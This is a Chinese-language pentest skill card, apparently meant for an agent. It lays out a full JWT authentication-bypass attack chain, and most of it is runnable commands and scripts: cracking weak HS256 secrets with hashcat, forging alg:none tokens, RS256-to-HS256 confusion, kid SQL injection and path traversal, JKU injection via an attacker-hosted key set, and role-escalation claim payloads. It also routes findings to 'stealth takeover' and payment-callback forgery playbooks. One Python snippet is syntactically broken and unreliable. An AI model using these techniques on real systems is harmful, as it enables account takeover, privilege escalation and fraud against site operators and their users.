---
name: 李代桃僵
description: >-
 JWT 鉴权完整攻击链：弱 HS256 碰撞、alg:none 绕过、kid SQL注入/路径穿越、
 RS256→HS256 算法混淆、JKU/JWK 注入、过期不验、撤权后 TTL 旧票、
 version/jti 枚举复活。
 GVA authorityId → ginvue-admin-stealth-takeover；
 若依 Redis captcha → 若依四海卡；支付 sign → payment-callback-forgery。
 TG 云控 JWT+/proxy/list+/admin/users 认族走 tg-cloud-panel，锤子仍用本卡。
version: 1.0.0
---

> **方源**
> 人是万物之灵，蛊是天地真精。
> 今朝剑指叠云处，炼蛊炼人还炼天！

# JWT 鉴权绕过完整手法

**前提**：目标在 `授权范围`。默认入口先 `jwt_gql_probe` 摸情况，再按结果选攻击路。

---

## 快速入口

```bash
# 自动摸 JWT 算法 / 弱 secret / GraphQL 面
python3 炼蛊房/jwt_gql_probe.py -u https://授权站 --case <案卷>

# 已有票时（抓包、注册、登录获取）
python3 炼蛊房/jwt_gql_probe.py -u https://授权站 --token '<JWT>' --case <案卷>

# none / 改 claim 重放（对照未授权，禁止把公开接口报成绕过）
python3 炼蛊房/jwt_forge_probe.py none --token '<JWT>' --url https://授权/api/user/info --case <案>
python3 炼蛊房/jwt_forge_probe.py claim --token '<JWT>' --url https://授权/api/me --set role=admin --case <案>
```

作业手法：`传承/李代桃僵.md`。GVA / 若依 / TG 云控先认族。  
改密后旧票是否仍活：`jwt_persist_probe.py drive --url https://授权/api/me --token '<旧票>' --case <案>`（`jwt-stateless-persist`）。

---

## 分流决策树

```
拿到 JWT
 ├─ 字面 `...` 掩码串（`eyJhbG...XXXX`）→ 原样重放 /auth/check，当 session 查找键（第四族）
 ├─ alg=HS256 → 先碰撞公开字典（见 §1）
 ├─ alg=RS256 且拿得到公钥 → §3 算法混淆
 ├─ kid 字段存在 → §4 kid 注入
 ├─ jku / x5u 字段存在 → §5 JKU 注入
 ├─ alg=none 未验 → §2
 ├─ exp 可控 → 换超远未来时间戳
 └─ GVA / 若依 / 假支付 → 切专卡（见文末交接）
```

---

## §1 弱 HS256 密钥碰撞

```bash
# hashcat 最快（GPU）
hashcat -a 0 -m 16500 '<JWT>' dict/jwt_hs256_public.txt --show

# john 方式
john --wordlist=dict/jwt_hs256_public.txt --format=HMAC-SHA256 jwt.txt

# jwt_tool 在线爆破
python3 jwt_tool.py '<JWT>' -C -d dict/jwt_hs256_public.txt

# 常见弱密钥（手动先试；教程默认优先）
# your_secret_key your-secret-key your-256-bit-secret
# secret password 123456 test jwt_secret SECRET_KEY
# APP_SECRET CHANGE_ME supersecret 0123456789abcdef
```

**碰到密钥后**：
```python
import jwt, json
payload = jwt.decode(original_token, options={"verify_signature": False})
payload["role"] = "admin" # 或 authorityId, userId
payload["exp"] = 9999999999 # 可选：延长过期
forged = jwt.encode(payload, "cracked_secret", algorithm="HS256")
print(forged)
```

---

## §2 alg:none / 不验签

```bash
# 方法一：手工
python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"

# 方法二：jwt_tool
python3 jwt_tool.py '<JWT>' -X a # alg:none
python3 jwt_tool.py '<JWT>' -X n # none + 空签
python3 jwt_tool.py '<JWT>' -X s # 替换空白 sig

# 变体（服务端大小写不敏感）
# "alg":"None" "alg":"NONE" "alg":"nOnE"
```

---

## §3 RS256 → HS256 算法混淆

适用：服务端用 RSA 公钥验签，但接受 `alg:HS256`——此时用公钥当 HMAC 密钥。

```bash
# 获取公钥（常见路径）
curl https://授权站/.well-known/jwks.json # JWK Set
curl https://授权站/api/auth/public-key
curl https://授权站/certs
openssl s_client -connect 授权站:443 -showcerts # 证书提取

# jwt_tool 自动混淆
python3 jwt_tool.py '<RS256-token>' -X k -pk public_key.pem

# 手工（python-jose / PyJWT<2.0）
from jose import jwt as jose_jwt
import open(pub_key_path).read() as pub
forged = jose_jwt.encode(payload, pub, algorithm="HS256")
```

---

## §4 kid 注入

### SQL 注入型

```bash
# kid: 0 UNION SELECT 'my_secret'--
# 用 jwt_tool 注入
python3 jwt_tool.py '<JWT>' -I -hc kid -hv "0 UNION SELECT 'my_secret'-- -" -S hs256 -p my_secret

# URL 编码变体（WAF 绕过）
# "kid": "0%20UNION%20SELECT%20%27my_secret%27--"
```

### 路径穿越型（文件读取）

```bash
# kid: ../../../../dev/null（空内容做 HMAC key = 0字节 key）
python3 jwt_tool.py '<JWT>' -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# kid 指向已知文件内容
# kid: /etc/hosts → 用 /etc/hosts 内容做密钥
# kid: /proc/sys/kernel/randomize_va_space → "2\n"
```

---

## §5 JKU / x5u 注入

将 JKU 字段改为攻击者控制的 URL，服务端会从该 URL 下载公钥并验签。

```bash
# 1. 生成 RSA 密钥对
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# 2. 生成 JWK Set（用 jwt_tool 或手工）
python3 jwt_tool.py '<JWT>' -X s -jku https://attacker.com/jwks.json

# 3. 在攻击者域名上托管 jwks.json：
# {
# "keys": [{
# "kty": "RSA", "use": "sig", "alg": "RS256",
# "n": "<base64url n>", "e": "AQAB"
# }]
# }

# 4. 用自己私钥签发伪造 token，jku 指向自控 URL
```

---

## §6 过期/撤权不验

```bash
# 手工修改 exp 字段（不重签，看服务端是否验签名）
python3 -c "
import base64,json
# 解 payload
parts = '<JWT>'.split('.')
p = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
p['exp'] = 9999999999
new_p = base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).rstrip(b'=').decode()
print(f'{parts[0]}.{new_p}.{parts[2]}') # 原签名，看是否报验签失败
"

# 撤权后旧票仍 200（TTL 内、未改 claim）= 预期行为，不是洞
# 撤权后过了 exp 仍 200 才是真洞
# 撤权后枚举 ver/version/v/token_version/jti（1..5）并重签，五次内复活 = 真洞
# （需已撞开 HS256；TTL 误报闸见 rbac-bypass-authz）
```

---

## §7 常见 JWT Header/Payload 字段提权

```json
// 常见提权字段
{"role": "admin"}
{"isAdmin": true}
{"authorityId": 777} // GVA → 切专卡
{"authorities": ["ROLE_ADMIN"]} // Spring Security
{"scope": "admin"}
{"groups": ["admins"]}
{"sub": "admin"} // 直接替换用户名
{"userId": 1} // IDOR 枚举
{"tenantId": 0} // 超级租户
```

---

## §8 实战辅助命令

```bash
# 解码（不验证）
python3 -c "import jwt,sys; print(jwt.decode(sys.argv[1], options={'verify_signature':False}))" '<JWT>'

# 或 base64 手工
echo '<payload_base64>' | base64 -d 2>/dev/null

# jwt_tool 基础解析
python3 jwt_tool.py '<JWT>' -d

# 时间戳转换
python3 -c "import datetime; print(datetime.datetime.fromtimestamp(1893456000))"
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 确认 JWT 算法 / 发现弱 secret |
| L2 | 低权 → 管理员 claims + **管理接口 200** |
| L3 | 管理 API 操作成功（读他人数据 / 改角色）|
| 误报 | 撤权后 TTL 内旧票仍可用（禁止当洞） |
| 真洞 | 撤权后枚举 `ver`/`version`/`v`/`jti` 五次内复活 |

---

## 交接

| 发现 | 切到 |
|------|------|
| GVA `authorityId` 提权 | `ginvue-admin-stealth-takeover` |
| 若依 Redis 验证码 | `ruoyi-fork-admin-pentest` |
| GraphQL 字段注入 | `传承/李代桃僵·星念.md` §GraphQL |
| 支付 sign 伪造 | `payment-callback-forgery` |
| RBAC 水平/垂直越权 | `rbac-bypass-authz` |
| 弱 secret 来自前端 JS | `js-reverse` → 抽 secret → 回本卡 |
| TG `/proxy/list` `/admin/users` Session ZIP | `tg-cloud-panel` 认族 → 本卡撞钥 → `rbac-bypass-authz` |

---

## 真源

- 手法：`传承/李代桃僵.md` · `传承/李代桃僵·星念.md`
- 工具：`python3 炼蛊房/jwt_gql_probe.py --help`
- 锻造：`python3 炼蛊房/jwt_forge_probe.py --help`
- 字典：`dict/jwt_hs256_public.txt`
